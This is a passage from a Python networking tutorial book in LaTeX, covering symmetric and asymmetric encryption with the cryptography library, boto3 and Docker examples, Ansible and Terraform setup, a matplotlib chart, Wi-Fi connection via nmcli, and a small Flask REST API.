\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Encrypted message: }\SpecialCharTok{\{}\NormalTok{encrypted\_message}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Decrypt the message}
\NormalTok{decrypted\_message }\OperatorTok{=}\NormalTok{ cipher\_suite.decrypt(encrypted\_message)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Decrypted message: }\SpecialCharTok{\{}\NormalTok{decrypted\_message}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Firewalls}\label{firewalls}

Firewalls are security systems that monitor and control incoming and
outgoing network traffic based on predetermined security rules.

\subsection{Computing Infrastructures}\label{computing-infrastructures}

\subsubsection{Cloud Computing}\label{cloud-computing}

Cloud computing delivers computing services (e.g., servers, storage,
databases, networking, software) over the internet. Key providers
include AWS, Azure, and Google Cloud.

\paragraph{Example: Connecting to AWS S3 using
Boto3}\label{example-connecting-to-aws-s3-using-boto3}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ boto3}

\CommentTok{\# Create a session using Amazon S3}
\NormalTok{session }\OperatorTok{=}\NormalTok{ boto3.Session(}
\NormalTok{    aws\_access\_key\_id}\OperatorTok{=}\StringTok{\textquotesingle{}YOUR\_ACCESS\_KEY\textquotesingle{}}\NormalTok{,}
\NormalTok{    aws\_secret\_access\_key}\OperatorTok{=}\StringTok{\textquotesingle{}YOUR\_SECRET\_KEY\textquotesingle{}}\NormalTok{,}
\NormalTok{    region\_name}\OperatorTok{=}\StringTok{\textquotesingle{}us{-}west{-}2\textquotesingle{}}
\NormalTok{)}

\CommentTok{\# Create an S3 client}
\NormalTok{s3 }\OperatorTok{=}\NormalTok{ session.client(}\StringTok{\textquotesingle{}s3\textquotesingle{}}\NormalTok{)}

\CommentTok{\# List buckets}
\NormalTok{response }\OperatorTok{=}\NormalTok{ s3.list\_buckets()}
\BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}Buckets:\textquotesingle{}}\NormalTok{, [bucket[}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{] }\ControlFlowTok{for}\NormalTok{ bucket }\KeywordTok{in}\NormalTok{ response[}\StringTok{\textquotesingle{}Buckets\textquotesingle{}}\NormalTok{]])}
\end{Highlighting}
\end{Shaded}

\subsubsection{Virtualization}\label{virtualization}

Virtualization allows you to create multiple simulated environments or
dedicated resources from a single, physical hardware system.

\paragraph{\texorpdfstring{Example: Using \texttt{docker} Python Library
for Container
Management}{Example: Using docker Python Library for Container Management}}\label{example-using-docker-python-library-for-container-management}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install docker}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ docker}

\NormalTok{client }\OperatorTok{=}\NormalTok{ docker.from\_env()}

\CommentTok{\# List containers}
\ControlFlowTok{for}\NormalTok{ container }\KeywordTok{in}\NormalTok{ client.containers.}\BuiltInTok{list}\NormalTok{():}
    \BuiltInTok{print}\NormalTok{(container.name)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Data Centers}\label{data-centers}

Data centers house computing resources like servers, storage, and
networking equipment. They are critical for hosting applications and
managing data.

\subsection{Example: Comprehensive Advanced Networking
Script}\label{example-comprehensive-advanced-networking-script}

This script demonstrates WAN connection simulation, encryption, and
cloud resource management.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ cryptography.fernet }\ImportTok{import}\NormalTok{ Fernet}
\ImportTok{import}\NormalTok{ boto3}
\ImportTok{import}\NormalTok{ docker}

\CommentTok{\# WAN Connection Simulation}
\KeywordTok{def}\NormalTok{ simulate\_wan\_connection():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Simulating WAN connection using MPLS..."}\NormalTok{)}
    \CommentTok{\# Simulation logic here}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"WAN connection established."}\NormalTok{)}

\CommentTok{\# Encryption and Decryption}
\KeywordTok{def}\NormalTok{ encrypt\_decrypt\_message(message):}
\NormalTok{    key }\OperatorTok{=}\NormalTok{ Fernet.generate\_key()}
\NormalTok{    cipher\_suite }\OperatorTok{=}\NormalTok{ Fernet(key)}
    
\NormalTok{    encrypted\_message }\OperatorTok{=}\NormalTok{ cipher\_suite.encrypt(message.encode())}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Encrypted message: }\SpecialCharTok{\{}\NormalTok{encrypted\_message}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    
\NormalTok{    decrypted\_message }\OperatorTok{=}\NormalTok{ cipher\_suite.decrypt(encrypted\_message)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Decrypted message: }\SpecialCharTok{\{}\NormalTok{decrypted\_message}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Cloud Resource Management}
\KeywordTok{def}\NormalTok{ manage\_aws\_s3():}
\NormalTok{    session }\OperatorTok{=}\NormalTok{ boto3.Session(}
\NormalTok{        aws\_access\_key\_id}\OperatorTok{=}\StringTok{\textquotesingle{}YOUR\_ACCESS\_KEY\textquotesingle{}}\NormalTok{,}
\NormalTok{        aws\_secret\_access\_key}\OperatorTok{=}\StringTok{\textquotesingle{}YOUR\_SECRET\_KEY\textquotesingle{}}\NormalTok{,}
\NormalTok{        region\_name}\OperatorTok{=}\StringTok{\textquotesingle{}us{-}west{-}2\textquotesingle{}}
\NormalTok{    )}
    
\NormalTok{    s3 }\OperatorTok{=}\NormalTok{ session.client(}\StringTok{\textquotesingle{}s3\textquotesingle{}}\NormalTok{)}
    
\NormalTok{    response }\OperatorTok{=}\NormalTok{ s3.list\_buckets()}
    \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}Buckets:\textquotesingle{}}\NormalTok{, [bucket[}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{] }\ControlFlowTok{for}\NormalTok{ bucket }\KeywordTok{in}\NormalTok{ response[}\StringTok{\textquotesingle{}Buckets\textquotesingle{}}\NormalTok{]])}

\CommentTok{\# Container Management with Docker}
\KeywordTok{def}\NormalTok{ manage\_docker\_containers():}
\NormalTok{    client }\OperatorTok{=}\NormalTok{ docker.from\_env()}
    
    \ControlFlowTok{for}\NormalTok{ container }\KeywordTok{in}\NormalTok{ client.containers.}\BuiltInTok{list}\NormalTok{():}
        \BuiltInTok{print}\NormalTok{(container.name)}

\CommentTok{\# Main function to execute all tasks}
\KeywordTok{def}\NormalTok{ main():}
\NormalTok{    simulate\_wan\_connection()}
\NormalTok{    encrypt\_decrypt\_message(}\StringTok{"Advanced Networking with Python"}\NormalTok{)}
\NormalTok{    manage\_aws\_s3()}
\NormalTok{    manage\_docker\_containers()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-48}

Advanced networking concepts like WAN technologies, network security,
and computing infrastructures are vital for managing modern networks.
Python provides powerful libraries to handle these tasks, such as
\texttt{cryptography} for encryption, \texttt{boto3} for cloud resource
management, and \texttt{docker} for container management. By mastering
these tools and concepts, you can design and manage secure, efficient,
and scalable network infrastructures.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{cryptography} Python
Module for Basic Encryption and
Decryption}{Deep Dive into the cryptography Python Module for Basic Encryption and Decryption}}\label{deep-dive-into-the-cryptography-python-module-for-basic-encryption-and-decryption}

The \texttt{cryptography} library in Python is a comprehensive package
for cryptographic operations. It provides cryptographic recipes and
primitives to help developers build secure applications. This tutorial
will focus on basic encryption and decryption using symmetric and
asymmetric cryptography.

\section{Table of Contents}\label{table-of-contents-20}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-the-cryptography-library]{Introduction to
  the \texttt{cryptography} Library}
\item
  \hyperref[installing-the-cryptography-library]{Installing the
  \texttt{cryptography} Library}
\item
  \hyperref[symmetric-encryption-and-decryption]{Symmetric Encryption
  and Decryption}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[encrypting-with-fernet]{Encrypting with Fernet}
  \item
    \hyperref[decrypting-with-fernet]{Decrypting with Fernet}
  \end{itemize}
\item
  \hyperref[asymmetric-encryption-and-decryption]{Asymmetric Encryption
  and Decryption}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[generating-rsa-keys]{Generating RSA Keys}
  \item
    \hyperref[encrypting-with-rsa]{Encrypting with RSA}
  \item
    \hyperref[decrypting-with-rsa]{Decrypting with RSA}
  \end{itemize}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to the \texttt{cryptography}
Library}{Introduction to the cryptography Library}}\label{introduction-to-the-cryptography-library}

The \texttt{cryptography} library is designed to provide both high-level
recipes and low-level interfaces for various cryptographic algorithms.
It supports both symmetric and asymmetric encryption, hashing, key
derivation, and more.

\section{\texorpdfstring{Installing the \texttt{cryptography}
Library}{Installing the cryptography Library}}\label{installing-the-cryptography-library-1}

To install the \texttt{cryptography} library, use \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install cryptography}
\end{Highlighting}
\end{Shaded}

\section{Symmetric Encryption and
Decryption}\label{symmetric-encryption-and-decryption}

Symmetric encryption uses the same key for both encryption and
decryption. The \texttt{cryptography} library provides a high-level
interface for symmetric encryption through the Fernet module.

\subsection{Encrypting with Fernet}\label{encrypting-with-fernet}

Fernet guarantees that a message encrypted using it cannot be
manipulated or read without the key. It uses AES in CBC mode with a
128-bit key for encryption and HMAC using SHA256 for authentication.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ cryptography.fernet }\ImportTok{import}\NormalTok{ Fernet}

\CommentTok{\# Generate a key}
\NormalTok{key }\OperatorTok{=}\NormalTok{ Fernet.generate\_key()}
\NormalTok{cipher\_suite }\OperatorTok{=}\NormalTok{ Fernet(key)}

\CommentTok{\# Encrypt a message}
\NormalTok{message }\OperatorTok{=} \StringTok{b"Secret message"}
\NormalTok{cipher\_text }\OperatorTok{=}\NormalTok{ cipher\_suite.encrypt(message)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Key: }\SpecialCharTok{\{}\NormalTok{key}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Cipher text: }\SpecialCharTok{\{}\NormalTok{cipher\_text}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Decrypting with Fernet}\label{decrypting-with-fernet}

To decrypt a message, use the same key that was used for encryption.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Decrypt the message}
\NormalTok{plain\_text }\OperatorTok{=}\NormalTok{ cipher\_suite.decrypt(cipher\_text)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Plain text: }\SpecialCharTok{\{}\NormalTok{plain\_text}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Asymmetric Encryption and
Decryption}\label{asymmetric-encryption-and-decryption}

Asymmetric encryption uses a pair of keys: a public key for encryption
and a private key for decryption. The \texttt{cryptography} library
supports RSA for asymmetric encryption.

\subsection{Generating RSA Keys}\label{generating-rsa-keys}

First, generate an RSA key pair.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ cryptography.hazmat.primitives.asymmetric }\ImportTok{import}\NormalTok{ rsa}
\ImportTok{from}\NormalTok{ cryptography.hazmat.primitives }\ImportTok{import}\NormalTok{ serialization}

\CommentTok{\# Generate private key}
\NormalTok{private\_key }\OperatorTok{=}\NormalTok{ rsa.generate\_private\_key(}
\NormalTok{    public\_exponent}\OperatorTok{=}\DecValTok{65537}\NormalTok{,}
\NormalTok{    key\_size}\OperatorTok{=}\DecValTok{2048}
\NormalTok{)}

\CommentTok{\# Generate public key}
\NormalTok{public\_key }\OperatorTok{=}\NormalTok{ private\_key.public\_key()}

\CommentTok{\# Serialize private key}
\NormalTok{pem }\OperatorTok{=}\NormalTok{ private\_key.private\_bytes(}
\NormalTok{    encoding}\OperatorTok{=}\NormalTok{serialization.Encoding.PEM,}
    \BuiltInTok{format}\OperatorTok{=}\NormalTok{serialization.PrivateFormat.PKCS8,}
\NormalTok{    encryption\_algorithm}\OperatorTok{=}\NormalTok{serialization.NoEncryption()}
\NormalTok{)}

\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}private\_key.pem\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}wb\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ pem\_out:}
\NormalTok{    pem\_out.write(pem)}

\CommentTok{\# Serialize public key}
\NormalTok{pem }\OperatorTok{=}\NormalTok{ public\_key.public\_bytes(}
\NormalTok{    encoding}\OperatorTok{=}\NormalTok{serialization.Encoding.PEM,}
    \BuiltInTok{format}\OperatorTok{=}\NormalTok{serialization.PublicFormat.SubjectPublicKeyInfo}
\NormalTok{)}

\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}public\_key.pem\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}wb\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ pem\_out:}
\NormalTok{    pem\_out.write(pem)}
\end{Highlighting}
\end{Shaded}

\subsection{Encrypting with RSA}\label{encrypting-with-rsa}

Use the public key to encrypt a message.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ cryptography.hazmat.primitives.asymmetric }\ImportTok{import}\NormalTok{ padding}
\ImportTok{from}\NormalTok{ cryptography.hazmat.primitives }\ImportTok{import}\NormalTok{ hashes}

\CommentTok{\# Load public key}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}public\_key.pem\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}rb\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ pem\_in:}
\NormalTok{    public\_key }\OperatorTok{=}\NormalTok{ serialization.load\_pem\_public\_key(pem\_in.read())}

\CommentTok{\# Encrypt message}
\NormalTok{message }\OperatorTok{=} \StringTok{b"Secret message"}
\NormalTok{cipher\_text }\OperatorTok{=}\NormalTok{ public\_key.encrypt(}
\NormalTok{    message,}
\NormalTok{    padding.OAEP(}
\NormalTok{        mgf}\OperatorTok{=}\NormalTok{padding.MGF1(algorithm}\OperatorTok{=}\NormalTok{hashes.SHA256()),}
\NormalTok{        algorithm}\OperatorTok{=}\NormalTok{hashes.SHA256(),}
\NormalTok{        label}\OperatorTok{=}\VariableTok{None}
\NormalTok{    )}
\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Cipher text: }\SpecialCharTok{\{}\NormalTok{cipher\_text}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Decrypting with RSA}\label{decrypting-with-rsa}

Use the private key to decrypt the message.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Load private key}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}private\_key.pem\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}rb\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ pem\_in:}
\NormalTok{    private\_key }\OperatorTok{=}\NormalTok{ serialization.load\_pem\_private\_key(pem\_in.read(), password}\OperatorTok{=}\VariableTok{None}\NormalTok{)}

\CommentTok{\# Decrypt message}
\NormalTok{plain\_text }\OperatorTok{=}\NormalTok{ private\_key.decrypt(}
\NormalTok{    cipher\_text,}
\NormalTok{    padding.OAEP(}
\NormalTok{        mgf}\OperatorTok{=}\NormalTok{padding.MGF1(algorithm}\OperatorTok{=}\NormalTok{hashes.SHA256()),}
\NormalTok{        algorithm}\OperatorTok{=}\NormalTok{hashes.SHA256(),}
\NormalTok{        label}\OperatorTok{=}\VariableTok{None}
\NormalTok{    )}
\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Plain text: }\SpecialCharTok{\{}\NormalTok{plain\_text}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-49}

This tutorial has provided a comprehensive guide to using the
\texttt{cryptography} library for basic encryption and decryption in
Python. With \texttt{cryptography}, you can implement both symmetric and
asymmetric encryption in your applications, ensuring data privacy and
security. Whether you need to encrypt sensitive data or secure
communication channels, \texttt{cryptography} provides the tools you
need to build secure applications.

\bookmarksetup{startatroot}

\chapter{Modern Network Practices with
Python}\label{modern-network-practices-with-python}

Modern network practices encompass a wide range of methodologies and
technologies to manage and automate network infrastructure, optimize
project management, and ensure efficient communication and service
delivery. This tutorial covers DevOps practices, managerial issues,
wireless communication protocols, phone networks, and service delivery,
with examples using Python libraries such as Ansible, Terraform,
Matplotlib, Flask, and Django.

\subsection{DevOps Practices}\label{devops-practices}

\subsubsection{Continuous Integration and
Deployment}\label{continuous-integration-and-deployment}

Continuous Integration (CI) and Continuous Deployment (CD) are DevOps
practices aimed at automating the integration and deployment of code
changes.

\paragraph{Example: Automating Infrastructure with
Ansible}\label{example-automating-infrastructure-with-ansible}

Ansible is an open-source automation tool for configuration management,
application deployment, and task automation.

\textbf{Install Ansible:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install ansible}
\end{Highlighting}
\end{Shaded}

\textbf{Example Ansible Playbook:}

Create a file named \texttt{playbook.yml}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{{-}}\AttributeTok{ }\FunctionTok{name}\KeywordTok{:}\AttributeTok{ Ensure web server is installed}
\AttributeTok{  }\FunctionTok{hosts}\KeywordTok{:}\AttributeTok{ webservers}
\AttributeTok{  }\FunctionTok{become}\KeywordTok{:}\AttributeTok{ }\CharTok{yes}
\AttributeTok{  }\FunctionTok{tasks}\KeywordTok{:}
\AttributeTok{    }\KeywordTok{{-}}\AttributeTok{ }\FunctionTok{name}\KeywordTok{:}\AttributeTok{ Install nginx}
\AttributeTok{      }\FunctionTok{apt}\KeywordTok{:}
\AttributeTok{        }\FunctionTok{name}\KeywordTok{:}\AttributeTok{ nginx}
\AttributeTok{        }\FunctionTok{state}\KeywordTok{:}\AttributeTok{ present}
\end{Highlighting}
\end{Shaded}

Run the playbook:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{ansible{-}playbook} \AttributeTok{{-}i}\NormalTok{ inventory playbook.yml}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Infrastructure as Code with
Terraform}\label{example-infrastructure-as-code-with-terraform}

Terraform is an open-source tool for building, changing, and versioning
infrastructure safely and efficiently.

\textbf{Install Terraform:}

Follow the installation instructions on the
\href{https://www.terraform.io/downloads}{Terraform website}.

\textbf{Example Terraform Configuration:}

Create a file named \texttt{main.tf}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{provider "aws" \{}
\NormalTok{  region = "us{-}west{-}2"}
\NormalTok{\}}

\NormalTok{resource "aws\_instance" "web" \{}
\NormalTok{  ami           = "ami{-}0c55b159cbfafe1f0"}
\NormalTok{  instance\_type = "t2.micro"}

\NormalTok{  tags = \{}
\NormalTok{    Name = "web\_instance"}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Run the Terraform commands:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{terraform}\NormalTok{ init}
\ExtensionTok{terraform}\NormalTok{ apply}
\end{Highlighting}
\end{Shaded}

\subsection{Managerial Issues}\label{managerial-issues}

\subsubsection{IT Project Management, Budgeting, and Strategic
Planning}\label{it-project-management-budgeting-and-strategic-planning}

Effective IT project management and budgeting are essential for
successful strategic planning.

\paragraph{Example: Visualizing IT Budget Data with
Matplotlib}\label{example-visualizing-it-budget-data-with-matplotlib}

Matplotlib is a comprehensive library for creating static, animated, and
interactive visualizations in Python.

\textbf{Install Matplotlib:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install matplotlib}
\end{Highlighting}
\end{Shaded}

\textbf{Example Visualization:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ matplotlib.pyplot }\ImportTok{as}\NormalTok{ plt}

\CommentTok{\# Sample IT budget data}
\NormalTok{categories }\OperatorTok{=}\NormalTok{ [}\StringTok{\textquotesingle{}Hardware\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Software\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Services\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Other\textquotesingle{}}\NormalTok{]}
\NormalTok{budget }\OperatorTok{=}\NormalTok{ [}\DecValTok{25000}\NormalTok{, }\DecValTok{15000}\NormalTok{, }\DecValTok{10000}\NormalTok{, }\DecValTok{5000}\NormalTok{]}

\CommentTok{\# Create a pie chart}
\NormalTok{plt.pie(budget, labels}\OperatorTok{=}\NormalTok{categories, autopct}\OperatorTok{=}\StringTok{\textquotesingle{}}\SpecialCharTok{\%1.1f\%\%}\StringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.title(}\StringTok{\textquotesingle{}IT Budget Allocation\textquotesingle{}}\NormalTok{)}
\NormalTok{plt.show()}
\end{Highlighting}
\end{Shaded}

\subsection{Wireless Communication
Protocols}\label{wireless-communication-protocols}

\subsubsection{Wi-Fi, Mobile Networks}\label{wi-fi-mobile-networks}

Wireless communication protocols like Wi-Fi and mobile networks are
crucial for modern connectivity.

\paragraph{Example: Simulating Wi-Fi Network
Connection}\label{example-simulating-wi-fi-network-connection}

\textbf{Example Simulation:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ subprocess}

\KeywordTok{def}\NormalTok{ connect\_to\_wifi(ssid, password):}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ subprocess.run([}\StringTok{\textquotesingle{}nmcli\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}dev\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}wifi\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}connect\textquotesingle{}}\NormalTok{, ssid, }\StringTok{\textquotesingle{}password\textquotesingle{}}\NormalTok{, password], capture\_output}\OperatorTok{=}\VariableTok{True}\NormalTok{, text}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
        \ControlFlowTok{if}\NormalTok{ result.returncode }\OperatorTok{==} \DecValTok{0}\NormalTok{:}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Successfully connected to }\SpecialCharTok{\{}\NormalTok{ssid}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        \ControlFlowTok{else}\NormalTok{:}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Failed to connect to }\SpecialCharTok{\{}\NormalTok{ssid}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{result}\SpecialCharTok{.}\NormalTok{stderr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{except} \PreprocessorTok{Exception} \ImportTok{as}\NormalTok{ e:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"An error occurred: }\SpecialCharTok{\{}\NormalTok{e}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{connect\_to\_wifi(}\StringTok{\textquotesingle{}Your\_SSID\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Your\_Password\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Phone Networks and Service
Delivery}\label{phone-networks-and-service-delivery}

\subsubsection{PSTN, VoIP, Mobile Network Architectures, Web Services,
Content Delivery Networks, and Service-Oriented
Architecture}\label{pstn-voip-mobile-network-architectures-web-services-content-delivery-networks-and-service-oriented-architecture}

Phone networks and service delivery are essential for modern
communication.

\paragraph{Example: Developing RESTful APIs with
Flask}\label{example-developing-restful-apis-with-flask}

Flask is a lightweight WSGI web application framework in Python.

\textbf{Install Flask:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install flask}
\end{Highlighting}
\end{Shaded}

\textbf{Example Flask API:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ flask }\ImportTok{import}\NormalTok{ Flask, jsonify, request}

\NormalTok{app }\OperatorTok{=}\NormalTok{ Flask(}\VariableTok{\_\_name\_\_}\NormalTok{)}

\CommentTok{\# Sample data}
\NormalTok{devices }\OperatorTok{=}\NormalTok{ [}
\NormalTok{    \{}\StringTok{\textquotesingle{}id\textquotesingle{}}\NormalTok{: }\DecValTok{1}\NormalTok{, }\StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Router\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}status\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Active\textquotesingle{}}\NormalTok{\},}
\NormalTok{    \{}\StringTok{\textquotesingle{}id\textquotesingle{}}\NormalTok{: }\DecValTok{2}\NormalTok{, }\StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Switch\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}status\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Inactive\textquotesingle{}}\NormalTok{\}}
\NormalTok{]}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/devices\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}GET\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ get\_devices():}
    \ControlFlowTok{return}\NormalTok{ jsonify(devices)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/devices/\textless{}int:device\_id\textgreater{}\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}GET\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ get\_device(device\_id):}
\NormalTok{    device }\OperatorTok{=} \BuiltInTok{next}\NormalTok{((device }\ControlFlowTok{for}\NormalTok{ device }\KeywordTok{in}\NormalTok{ devices }\ControlFlowTok{if}\NormalTok{ device[}\StringTok{\textquotesingle{}id\textquotesingle{}}\NormalTok{] }\OperatorTok{==}\NormalTok{ device\_id), }\VariableTok{None}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ jsonify(device) }\ControlFlowTok{if}\NormalTok{ device }\ControlFlowTok{else}\NormalTok{ (}\StringTok{\textquotesingle{}\textquotesingle{}}\NormalTok{, }\DecValTok{404}\NormalTok{)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/devices\textquotesingle{}}\NormalTok{, methods}\OperatorTok{=}\NormalTok{[}\StringTok{\textquotesingle{}POST\textquotesingle{}}\NormalTok{])}
\KeywordTok{def}\NormalTok{ create\_device():}
\NormalTok{    new\_device }\OperatorTok{=}\NormalTok{ request.get\_json()}
\NormalTok{    devices.append(new\_device)}
    \ControlFlowTok{return}\NormalTok{ jsonify(new\_device), }\DecValTok{201}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    app.run(debug}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-50}

Modern network practices involve a combination of DevOps methodologies,
effective IT project management, wireless communication protocols, and
efficient service delivery systems. Python provides powerful libraries
such as Ansible, Terraform, Matplotlib, Flask, and Django to facilitate
these tasks. By mastering these tools and practices, you can build,
manage, and optimize robust network infrastructures.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial for the Ansible Python Module for
Infrastructure
Management}\label{deep-dive-tutorial-for-the-ansible-python-module-for-infrastructure-management}

Ansible is a powerful automation tool used for infrastructure
management. It allows users to automate tasks such as configuration
management, application deployment, and task automation. In this
tutorial, we will dive deep into using the Ansible Python API to manage
infrastructure.

\section{Table of Contents}\label{table-of-contents-21}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-ansible]{Introduction to Ansible}
\item
  \hyperref[installing-ansible-and-the-python-api]{Installing Ansible
  and the Python API}
\item
  \hyperref[setting-up-your-environment]{Setting Up Your Environment}
\item
  \hyperref[basic-concepts-of-ansible]{Basic Concepts of Ansible}
\item
  \hyperref[using-the-ansible-python-api]{Using the Ansible Python API}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[running-ad-hoc-commands]{Running Ad-Hoc Commands}
  \item
    \hyperref[running-playbooks]{Running Playbooks}
  \item
    \hyperref[managing-inventory]{Managing Inventory}
  \end{itemize}
\item
  \hyperref[advanced-usage]{Advanced Usage}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[custom-modules]{Custom Modules}
  \item
    \hyperref[callbacks]{Callbacks}
  \item
    \hyperref[handling-results]{Handling Results}
  \end{itemize}
\item
